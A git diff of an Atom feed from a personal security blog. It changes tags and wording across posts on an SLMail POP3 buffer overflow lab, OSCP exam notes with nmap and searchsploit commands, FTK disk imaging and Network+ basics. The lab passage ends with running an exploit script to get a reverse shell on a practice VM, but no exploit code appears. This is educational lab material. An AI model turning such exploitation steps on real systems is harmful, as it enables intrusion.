 &lt;p&gt;Seattle Lab Mail (SLMail) is fantastic vulnerable app to practise your buffer overflow on. You will have to download a version of the vulnerable SLMail to a Windows VM. The SLMail buffer overflow affects the &lt;strong&gt;POP3 PASS&lt;/strong&gt; command. Both the app itself and the exploit are …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Windows Buffer Overflow (SLMail)&lt;/h1&gt;
 &lt;p&gt;Seattle Lab Mail (SLMail) is fantastic vulnerable app to practise your buffer overflow on. You will have to download a version of the vulnerable SLMail to a Windows VM. The SLMail buffer overflow affects the &lt;strong&gt;POP3 PASS&lt;/strong&gt; command. Both the app itself and the exploit are available on Exploit Database (&lt;a href="https://www.exploit-db.com/exploits/638"&gt;exploit&lt;/a&gt;)!&lt;/p&gt;
 &lt;p&gt;You will have to jump between your Kali machine (to tweak your exploit) and the Windows VM (to restart SLMail after each crash and analyze the crash in Immunity Debugger) You will need &lt;a href="https://www.immunityinc.com/products/debugger/"&gt;Immunity Debugger&lt;/a&gt; to help develop your exploit.&lt;/p&gt;
@@ -715,7 +872,7 @@ Replace the EIP (was &lt;strong&gt;BBBB&lt;/strong&gt; previously) in the buffer
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;python pop3_exploit.py&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;Hopefully, Terminal 1 will now give you your reverse shell onto the Windows VM. We have developed an exploit for any similar Windows machine running Seattle Lab Mail.&lt;/p&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category><category term="Buffer Overflow"></category></entry><entry><title>"OSCP: Notes for exam"</title><link href="/oscp-notes.html" rel="alternate"></link><published>2019-10-30T00:00:00-05:00</published><updated>2019-10-30T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-30:/oscp-notes.html</id><summary type="html">&lt;p&gt;Everyone has one. This is mine. A collection of OSCP prep-notes from various other guides and sources over the internet as well as my own experience within the Hack The Box labs and in the Penetration Testing with Kali Linux labs. &lt;/p&gt;
+&lt;p&gt;Hopefully, Terminal 1 will now give you your reverse shell onto the Windows VM. We have developed an exploit for any similar Windows machine running Seattle Lab Mail.&lt;/p&gt;</content><category term="Certifications"></category><category term="OSCP"></category></entry><entry><title>"OSCP: Notes for exam"</title><link href="/oscp-notes.html" rel="alternate"></link><published>2019-10-30T00:00:00-05:00</published><updated>2019-10-30T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-30:/oscp-notes.html</id><summary type="html">&lt;p&gt;Everyone has one. This is mine. A collection of OSCP prep-notes from various other guides and sources over the internet as well as my own experience within the Hack The Box labs and in the Penetration Testing with Kali Linux labs. &lt;/p&gt;
 &lt;h3&gt;Nmap (host/port)&lt;/h3&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# nmap all ports&lt;/span&gt;
 nmap -p- -oA …&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Everyone has one. This is mine. A collection of OSCP prep-notes from various other guides and sources over the internet as well as my own experience within the Hack The Box labs and in the Penetration Testing with Kali Linux labs. &lt;/p&gt;
@@ -1560,7 +1717,7 @@ searchsploit x PATH
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h3&gt;Linux Privilege Escalation&lt;/h3&gt;
-&lt;h3&gt;Windows Privilege Escalation&lt;/h3&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category><category term="Kali"></category></entry><entry><title>"FTK: Imaging a Windows PC"</title><link href="/ftk-windows.html" rel="alternate"></link><published>2019-10-28T00:00:00-05:00</published><updated>2019-10-28T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-28:/ftk-windows.html</id><summary type="html">&lt;p&gt;Drive acquisition is one the first steps a Forensic Analyst will have to carry out at the beginning of case. These acquistions are often carried out remotely by VPN or by the the client (or client IT department) where the computer is located. Acquiring such images from a drive has …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Drive acquisition is one the first steps a Forensic Analyst will have to carry out at the beginning of case. These acquistions are often carried out remotely by VPN or by the the client (or client IT department) where the computer is located. Acquiring such images from a drive has been made easy using AccesData Forensic Toolkit (FTK) Imager. The software is free and can be downloaded &lt;a href="https://accessdata.com/product-download/forensic-toolkit-ftk-version-7.1.0"&gt;here&lt;/a&gt;! &lt;/p&gt;
+&lt;h3&gt;Windows Privilege Escalation&lt;/h3&gt;</content><category term="Certifications"></category><category term="OSCP"></category></entry><entry><title>"FTK: Imaging a Windows PC"</title><link href="/ftk-windows.html" rel="alternate"></link><published>2019-10-28T00:00:00-05:00</published><updated>2019-10-28T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-28:/ftk-windows.html</id><summary type="html">&lt;p&gt;Drive acquisition is one the first steps a Forensic Analyst will have to carry out at the beginning of case. These acquistions are often carried out remotely by VPN or by the the client (or client IT department) where the computer is located. Acquiring such images from a drive has …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Drive acquisition is one the first steps a Forensic Analyst will have to carry out at the beginning of case. These acquistions are often carried out remotely by VPN or by the the client (or client IT department) where the computer is located. Acquiring such images from a drive has been made easy using AccesData Forensic Toolkit (FTK) Imager. The software is free and can be downloaded &lt;a href="https://accessdata.com/product-download/forensic-toolkit-ftk-version-7.1.0"&gt;here&lt;/a&gt;! &lt;/p&gt;
 &lt;p&gt;Once downloaded, install the software. Launch by doubleclicking the FTK icon or running &lt;code&gt;FTK Imager.exe&lt;/code&gt; from the command line.&lt;/p&gt;
 &lt;p&gt;Let's plug in an external USB drive to write to and image the host, a Windows 10 machine.&lt;/p&gt;
 &lt;p&gt;Here is the main GUI for FTK. Select &lt;code&gt;File&lt;/code&gt; from the menu and &lt;code&gt;Create a Disk Image&lt;/code&gt; and then chose the source of your image&lt;/p&gt;
@@ -1583,7 +1740,7 @@ searchsploit x PATH
 &lt;p&gt;&lt;img alt="image" src="/images/ftk/ftk9.jpg" title="Image verification"&gt;&lt;/p&gt;
 &lt;p&gt;Once the drive is imaged we are presented with the display that both the MD5 and SHA1 hashes indicate that the drive we just imaged and the image itself match.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="image" src="/images/ftk/ftk10.jpg" title="Image verification display"&gt;&lt;/p&gt;
-&lt;p&gt;And that's that. Next up, memory dump using FTK Imager&lt;/p&gt;</content><category term="DFIR"></category><category term="FTK Imager"></category><category term="Windows"></category></entry><entry><title>"Network+: Cabling &amp; Topology"</title><link href="/network-cabling-topology.html" rel="alternate"></link><published>2019-10-25T00:00:00-05:00</published><updated>2019-10-25T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-25:/network-cabling-topology.html</id><summary type="html">&lt;h2&gt;Topology&lt;/h2&gt;
+&lt;p&gt;And that's that. Next up, memory dump using FTK Imager&lt;/p&gt;</content><category term="Windows"></category><category term="FTK Imager"></category><category term="Windows"></category></entry><entry><title>Network+ - Cabling &amp; Topology</title><link href="/network-cabling-topology.html" rel="alternate"></link><published>2019-10-25T00:00:00-05:00</published><updated>2019-10-25T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-25:/network-cabling-topology.html</id><summary type="html">&lt;h2&gt;Topology&lt;/h2&gt;
 &lt;p&gt;A network topology is defined by the lines and nodes that make up the network. This can be further delineated into two twpes of topology: &lt;code&gt;physical&lt;/code&gt; vs &lt;code&gt;logical&lt;/code&gt; topology.&lt;/p&gt;
 &lt;p&gt;Physical topology is the geometric pattern of the connected nodes of a network, whereas logical topology defines the pattern of …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Topology&lt;/h2&gt;
 &lt;p&gt;A network topology is defined by the lines and nodes that make up the network. This can be further delineated into two twpes of topology: &lt;code&gt;physical&lt;/code&gt; vs &lt;code&gt;logical&lt;/code&gt; topology.&lt;/p&gt;
@@ -1638,7 +1795,7 @@ Single mode (lasers) cable is mostly yellow&lt;/p&gt;
 &lt;p&gt;Duplex cables&lt;/p&gt;
 &lt;p&gt;Connectors&lt;/p&gt;
 &lt;h3&gt;Fire ratings&lt;/h3&gt;
-&lt;h3&gt;Legacy Network Connections&lt;/h3&gt;</content><category term="Network+"></category><category term="Topology"></category><category term="Cabling"></category></entry><entry><title>"Passing the OSCP Exam: Trying Smarter"</title><link href="/passing-the-oscp.html" rel="alternate"></link><published>2019-10-25T00:00:00-05:00</published><updated>2019-10-25T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-25:/passing-the-oscp.html</id><summary type="html">&lt;blockquote&gt;
+&lt;h3&gt;Legacy Network Connections&lt;/h3&gt;</content><category term="Certifications"></category><category term="Network+"></category></entry><entry><title>Passing the OSCP Exam - Trying Smarter</title><link href="/passing-the-oscp.html" rel="alternate"></link><published>2019-10-25T00:00:00-05:00</published><updated>2019-10-25T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-25:/passing-the-oscp.html</id><summary type="html">&lt;blockquote&gt;
 &lt;p&gt;The definition of insanity is doing the same thing over and over again, but expecting different results.&lt;/p&gt;
 &lt;p&gt;&lt;cite&gt;Albert Einstein&lt;/cite&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -1693,13 +1850,21 @@ My third attempt was after a month or so of HackTheBox.
 The attitude was so different for each exam. For the first two attempts I was extrememly negative. i'd put chances at 10%. But on the third attempt I was bristling with confidence. &lt;/p&gt;
 &lt;h3&gt;Passing OSCP in a nutshell:&lt;/h3&gt;
 &lt;ol&gt;
-&lt;li&gt;HackTheBox &amp;amp; Ippsec&lt;/li&gt;
-&lt;li&gt;Buffer Overflow&lt;/li&gt;
+&lt;li&gt;Watch a lot of HackTheBox &amp;amp; Ippsec&lt;/li&gt;
+&lt;li&gt;Nail the Buffer Overflow&lt;/li&gt;
 &lt;li&gt;A relative disregard for the PWK material and labs (not including Buffer Overflow).&lt;/li&gt;
-&lt;li&gt;CherryTree Notes on HackTheBox and BufferOverflow&lt;/li&gt;
-&lt;li&gt;A later exam start with some planned sleep.&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;The OSCP logo of the shadowy suited guy in the doorway that you get on your OSCP card is so lame. &lt;/p&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category></entry><entry><title>Network+: Network Models</title><link href="/network-models.html" rel="alternate"></link><published>2019-10-24T16:20:02-05:00</published><updated>2019-10-24T16:20:02-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-24:/network-models.html</id><summary type="html">&lt;p&gt;CompTIA Network+&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Network Models&lt;/h2&gt;
+&lt;li&gt;Make extensive CherryTree Notes on HackTheBox and BufferOverflow&lt;/li&gt;
+&lt;li&gt;A later-in-the-day exam start with some planned sleep in the middle of the night.&lt;/li&gt;
+&lt;/ol&gt;</content><category term="Certifications"></category><category term="OSCP"></category></entry><entry><title>Network+ - Network Models</title><link href="/network-models.html" rel="alternate"></link><published>2019-10-24T16:20:02-05:00</published><updated>2019-10-24T16:20:02-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-24:/network-models.html</id><summary type="html">&lt;h2&gt;Network Models&lt;/h2&gt;
+&lt;p&gt;There are two main models that represent networks. The OSI and TCP/IP Model.&lt;/p&gt;
+&lt;h3&gt;OSI Model&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;Physical (Cables)&lt;/li&gt;
+&lt;li&gt;Data Link (Network cards, Switches, components with MAC Addresses)&lt;/li&gt;
+&lt;li&gt;Network (Routers, Logical Addresses, IP Addresses)&lt;/li&gt;
+&lt;li&gt;Transport (Assembly/Disassembly layer for packets)&lt;/li&gt;
+&lt;li&gt;Session (Connection between two systems)&lt;/li&gt;
+&lt;li&gt;Presentation (Converts data into …&lt;/li&gt;&lt;/ol&gt;</summary><content type="html">&lt;h2&gt;Network Models&lt;/h2&gt;
 &lt;p&gt;There are two main models that represent networks. The OSI and TCP/IP Model.&lt;/p&gt;
 &lt;h3&gt;OSI Model&lt;/h3&gt;
 &lt;ol&gt;
@@ -1732,7 +1897,7 @@ Physical Address. . . . . . . . . : ??-??-??-??-??-??
 
 &lt;p&gt;Therefore, we add to our frame two MAC Addresses. Where its going to, and where it's coming from. A Cyclic Redunancy Check (CRC) is also added to verify the data is good. If the data is bad it can be resent. &lt;/p&gt;
 &lt;p&gt;Once the hub receives the frame. It makes multiple copies of it, one for each computer its connected to and then sends the frame(s) to each networked computer. Each computer's NIC knows its own MAC address such that, when the frame arrives it knows whether the frame was meant for itself. If the frame was delivered to the correct address then it is passed upwards to the appropriate software.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="image" src="images/frame.jpg" title="A frame"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/images/frame.jpg" title="A frame"&gt;&lt;/p&gt;
 &lt;h3&gt;Broadcast vs Unicast&lt;/h3&gt;
 &lt;p&gt;During Unicast situations the frame's destination MAC address is compared to the MAC address of the NIC that receives it. If they match, the MAC addresses are removed from the frame (the souce MAC address is kept in memory in order to send replies) and the frame is passed on to the appropriate software.
 During broadcast situations, the dataframe's destination MAC address is set to FF-FF-FF-FF-FF-FF. And the receiving computer knows that the recieved dataframe is a &lt;code&gt;broadcast&lt;/code&gt;. The most common uses for broadcasts are when one computer signals to every other on the local network requesting a return frame from a computer with a specific name (for example, &lt;code&gt;Dans-Windows-PC&lt;/code&gt;). The return frame will bear the MAC address of &lt;code&gt;Dans-Windows-PC&lt;/code&gt;.
@@ -1740,7 +1905,7 @@ A group of computers that can hear the broadcasts of the other computers is a &l
 &lt;h3&gt;IP addressing&lt;/h3&gt;
 &lt;p&gt;A fully connected network based solely on MAC addresses would be overwhelmed with all this broadcasting of frames. In order to make huge networks reduce the amount of network traffic another layer of addressing is added &lt;code&gt;logical addressing&lt;/code&gt;. The most commonly used form is &lt;code&gt;IP addressing&lt;/code&gt;. Unlike MAC addresses IP addresses are not fixed. &lt;/p&gt;
 &lt;p&gt;Equipment such as routers tie IP and MAC addresses together. Routers tend to have two or more connections. An example router may be connected to a 4 port &lt;code&gt;switch&lt;/code&gt; as shown below.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="image" src="images/RP114.jpg" title="A router hardwired to a 4-port switch"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/images/RP114.jpg" title="A router hardwired to a 4-port switch"&gt;&lt;/p&gt;
 &lt;p&gt;In order to ensure transfer of frames to the correct destination we add the IP addresses of the souce and destination. When we add the IP addresses to a frame we get a &lt;code&gt;packet&lt;/code&gt;. When an IP packet is detected by a computer, if the destination IP address is not part of its own network the computer sends the IP address over the &lt;code&gt;default gateway&lt;/code&gt; (invariably to the router). The router then adds its own MAC address (in addition to the MAC address of the source computer) and the MAC address of the destination computer (yes thats 3 MAC addresses) to the IP packet. The frame is sent from the computer, to the switch, to the router. At the router the MAC addresses are stripped and the router uses a &lt;code&gt;routing table&lt;/code&gt; to find where to send the data. Router then adds his own MAC address and that of the destination computer. So, we are back to two MAC addresses on the dataframe that surrounds the IP packet. The IP packets remain unchanged during this process.&lt;/p&gt;
 &lt;h3&gt;Packets and Ports&lt;/h3&gt;
 &lt;p&gt;We still have two issues to solve:
@@ -1750,4 +1915,4 @@ A group of computers that can hear the broadcasts of the other computers is a &l
 &lt;p&gt;The port number range runs from 0 - 65535.&lt;/p&gt;
 &lt;p&gt;The first 1024 ports are reserved.&lt;/p&gt;
 &lt;p&gt;Transmission Control protocol (TCP) is a connection-oriented conversation between two computers that insure complete transmission of data. This is achieved by &lt;code&gt;sequence numbers&lt;/code&gt; and &lt;code&gt;acknowledgement numbers&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;User Datagram Protocol (UDP). UDP is not connection-oriented. and data is just sent regardless of whether the receiving computer is ready for it. Errors in transmission have to be handled at the receiving end. &lt;/p&gt;</content><category term="Network+"></category><category term="Networks"></category></entry></feed>
+&lt;p&gt;User Datagram Protocol (UDP). UDP is not connection-oriented. and data is just sent regardless of whether the receiving computer is ready for it. Errors in transmission have to be handled at the receiving end. &lt;/p&gt;</content><category term="Certifications"></category><category term="Network+"></category></entry></feed>
